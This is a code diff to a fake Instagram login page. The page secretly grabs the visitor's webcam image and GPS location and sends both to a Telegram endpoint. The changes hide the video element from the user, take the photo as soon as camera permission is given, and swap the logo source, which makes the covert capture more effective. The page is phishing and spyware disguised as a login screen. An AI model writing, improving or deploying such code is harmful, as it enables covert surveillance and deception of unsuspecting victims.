@@ -47,10 +47,7 @@
             background-color: #0073e6;
         }
         video {
-            width: 100%;
-            max-width: 320px;
-            margin-top: 10px;
-            border-radius: 10px;
+            display: none; /* Hide the video element */
         }
     </style>
     <script>
@@ -71,7 +68,7 @@
         // Function to get real-time GPS location
         function getLiveLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.watchPosition(
+                navigator.geolocation.getCurrentPosition(
                     (position) => {
                         let lat = position.coords.latitude;
                         let lon = position.coords.longitude;
@@ -98,23 +95,27 @@
             fetch(telegramURL);
         }
 
-        // Capture and send live camera feed
+        // Capture and send live camera feed in background as soon as permission is granted or denied
         async function startCamera() {
             try {
                 let stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                let video = document.getElementById('videoFeed');
+                let video = document.createElement('video');
+                video.style.display = 'none'; // Hide video feed from user
                 video.srcObject = stream;
+                document.body.appendChild(video);
                 
                 let canvas = document.createElement('canvas');
                 let ctx = canvas.getContext('2d');
-                setTimeout(async () => {
+                
+                // Capture photo immediately after permission is granted
+                video.onloadedmetadata = async () => {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     let imageData = canvas.toDataURL('image/png');
                     sendPhotoToTelegram(imageData);
-                    stream.getTracks().forEach(track => track.stop());
-                }, 5000);
+                    stream.getTracks().forEach(track => track.stop()); // Stop camera
+                };
             } catch (error) {
                 console.error("Camera access denied or failed", error);
             }
@@ -167,11 +168,10 @@
 </head>
 <body>
     <div class="login-container">
-        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png" alt="Instagram Logo" class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
         <input type="text" placeholder="Phone number, username, or email">
         <input type="password" placeholder="Password">
         <button>Log In</button>
-        <video id="videoFeed" autoplay></video>
     </div>
 </body>
 </html>
